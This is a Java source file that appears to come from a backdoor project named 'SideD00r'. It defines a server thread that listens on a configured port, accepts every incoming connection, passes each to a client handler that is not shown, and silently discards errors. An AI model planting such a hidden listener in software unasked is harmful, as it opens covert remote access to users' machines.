package me.aaronakhtar.sided00r.threads;

import me.aaronakhtar.sided00r.SideD00r;
import me.aaronakhtar.sided00r.threads.handlers.SideD00rClientHandler;

import java.net.ServerSocket;

public class SideD00rServer extends Thread {

    public static volatile boolean running = true;

    @Override
    public void run() {
        try(ServerSocket sd_server = new ServerSocket(SideD00r.sd_port)){
            while(running){
                new Thread(new SideD00rClientHandler(sd_server.accept())).start();
            }
        }catch (Exception e){

        }
    }
}
